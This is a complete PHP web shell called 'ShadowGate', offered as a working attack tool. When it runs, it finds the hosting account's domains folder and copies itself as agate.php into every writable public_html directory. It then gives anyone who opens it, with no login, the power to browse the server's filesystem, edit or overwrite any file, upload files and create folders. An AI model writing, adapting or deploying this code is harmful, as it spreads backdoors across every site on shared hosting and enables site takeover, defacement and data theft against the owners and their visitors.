<?php
// 🛡️ ShadowGate | Auto deploy + shell
error_reporting(0);

// === Configuration ===
$copyName = 'agate.php';

// === Find /home/uXXXX/domains path ===
function locateDomainsPath($start) {
    $dir = realpath($start);
    while ($dir && $dir !== '/') {
        if (preg_match('/\/u[0-9a-z]+$/', $dir) && is_dir($dir . '/domains')) {
            return realpath($dir . '/domains');
        }
        $dir = dirname($dir);
    }
    return false;
}

// === Auto-Copy to Domains ===
function deployToDomains($sourceFile, $targetName) {
    $domainRoot = locateDomainsPath(__DIR__);
    $deployed = [];
    if ($domainRoot) {
        foreach (scandir($domainRoot) as $domain) {
            if ($domain === '.' || $domain === '..') continue;
            $htmlPath = "$domainRoot/$domain/public_html";
            if (is_dir($htmlPath) && is_writable($htmlPath)) {
                $targetPath = "$htmlPath/$targetName";
                if (@copy($sourceFile, $targetPath)) {
                    $deployed[] = "http://$domain/$targetName";
                }
            }
        }
    }
    return $deployed;
}

$self = __FILE__;
$urls = deployToDomains($self, $copyName);
if (!empty($urls)) {
    echo "<h3 style='color:#0f0'>✅ Duplicated as <code>$copyName</code>:</h3><ul>";
    foreach ($urls as $u) echo "<li><a href='$u' target='_blank' style='color:#6cf'>$u</a></li>";
    echo "</ul><hr>";
}

// === Shell Core ===
$cwd = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
if (!$cwd || !is_dir($cwd)) $cwd = getcwd();

echo "<style>
body { background:#1a1a1a; color:#ccc; font-family:monospace; padding:20px; }
a { color:#6cf; text-decoration:none; }
a:hover { text-decoration:underline; }
textarea,input[type=text] { width:100%; font-family:monospace; background:#222; color:#fff; border:1px solid #444; }
input[type=submit] { background:#333; color:#fff; border:none; padding:5px 10px; }
</style>";

echo "<h2>🗂️ ShadowGate</h2><p><b>Path:</b> ";
$parts = explode('/', trim($cwd, '/'));
$build = '/';
foreach ($parts as $part) {
    $build .= "$part/";
    echo "<a href='?path=" . urlencode($build) . "'>$part</a>/";
}
echo "</p><hr>";

// === File Editor ===
if (isset($_GET['edit'])) {
    $file = realpath($cwd . '/' . basename($_GET['edit']));
    if (is_file($file)) {
        if (isset($_POST['content'])) {
            file_put_contents($file, $_POST['content']);
            echo "<p style='color:#0f0'>✅ Saved</p>";
        }
        $code = htmlspecialchars(file_get_contents($file));
        echo "<h3>✏️ Editing: " . basename($file) . "</h3>
        <form method='post'>
            <textarea name='content' rows='20'>$code</textarea><br>
            <input type='submit' value='Save'>
        </form>
        <p><a href='?path=" . urlencode($cwd) . "'>🔙 Back</a></p>";
        exit;
    }
}

// === Upload Handler ===
if (!empty($_FILES['upload']['name'])) {
    $target = $cwd . '/' . basename($_FILES['upload']['name']);
    move_uploaded_file($_FILES['upload']['tmp_name'], $target);
    echo "<p style='color:#0f0'>📤 Uploaded: " . htmlspecialchars($_FILES['upload']['name']) . "</p>";
}

// === Folder Creation ===
if (!empty($_POST['newdir'])) {
    $newFolder = $cwd . '/' . basename($_POST['newdir']);
    if (!file_exists($newFolder)) {
        mkdir($newFolder);
        echo "<p style='color:#0f0'>📁 Folder created</p>";
    } else {
        echo "<p style='color:#f66'>❌ Folder already exists</p>";
    }
}

// === List Directory ===
echo "<ul>";
foreach (scandir($cwd) as $item) {
    if ($item === '.') continue;
    $full = $cwd . '/' . $item;
    $encodedPath = urlencode($cwd);
    if (is_dir($full)) {
        echo "<li>📁 <a href='?path=" . urlencode($full) . "'>" . htmlspecialchars($item) . "</a></li>";
    } else {
        echo "<li>📄 <a href='?path=$encodedPath&edit=" . urlencode($item) . "'>" . htmlspecialchars($item) . "</a></li>";
    }
}
echo "</ul><hr>";

// === Upload Form ===
echo "<form method='post' enctype='multipart/form-data'>
<label>📤 Upload File:</label><br>
<input type='file' name='upload'><br>
<input type='submit' value='Upload'>
</form>";

// === Create Folder Form ===
echo "<form method='post'>
<label>📁 New Folder:</label><br>
<input type='text' name='newdir'><br>
<input type='submit' value='Create'>
</form>";
?>
